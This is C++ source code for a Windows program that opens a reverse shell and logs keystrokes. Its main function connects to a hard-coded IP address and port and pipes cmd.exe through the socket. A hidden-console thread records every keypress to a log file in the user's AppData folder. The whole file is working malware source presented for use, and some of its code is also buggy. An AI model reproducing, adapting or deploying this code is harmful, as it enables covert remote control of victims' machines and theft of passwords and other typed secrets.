#include<iostream>
#include<winsock2.h>
#include<windows.h>
#include<stdio.h>
#include<ws2tcpip.h>
#include<thread>
#include<winuser.h>
#include<fstream>
#include<tchar.h>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

void log();
char filter_char(char key);
void hide_console();
void keylog();


int main(){
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA ws;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    int connect;
    char ip_addr[] = "192.168.1.9";
    int port = 8081;

    WSAStartup(MAKEWORD(2,2), &ws);
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connect = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);

    if(connect == SOCKET_ERROR){
        printf("[!] Connection to the target server failed, Please Try again!\n");
        exit(0);
    }

    else{
        thread key_log(keylog);
        recv(shell, RecvServer, sizeof(RecvServer), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;

        CreateProcess(NULL, _T("cmd.exe"), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer, 0, sizeof(RecvServer));
    }

    return 0;
}

void hide_console(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

char filter_char(char key){

    //this if statement checks whether the key is upper case and if the shift key is not pressed then it changes the character to lower case
    if((key>64) && (key<91) && !GetAsyncKeyState(0x10)){
        return key+32;
    }
    else{
        if(GetAsyncKeyState(0x10)){
            switch(key){
                case 49: return '!';
                case 50: return '@';
                case 51: return '#';
                case 52: return '$';
                case 53: return '%';
                case 54: return '^';
                case 55: return '&';
                case 56: return '*';
                case 57: return '(';
                case 58: return ')';
            }
        }
        else
            return key;
    }
}

void log(){
    char key;
    char* appdata = getenv("APPDATA");
    strcat(appdata,"\\log.txt");

    for(;;){
        // sleep(0);
        // the below loop is like looping through ascii values of the charcter
        for(key=8;key<=222;key++){
            //getasynckeystate function is a system interrupt which checks whether the user has entered the a keystroke
            if(GetAsyncKeyState(key) == -32767){
                ofstream write (appdata, ios::app);
                // write << c;
                switch(key){
                    case 8: write<<"<BackSpace>";
                            break;
                    case 27: write<<"<Esc>";
                            break;
                    case 127: write<<"<DEL>";
                            break;
                    case 32: write<<" ";
                            break;
                    case 13: write<<"<Enter>\n";
                            break;
                    default: write<<filter_char(key);
                            break;
                }

                write.close();
            }
        }
    }
}

void keylog(){
    hide_console();
    log();
}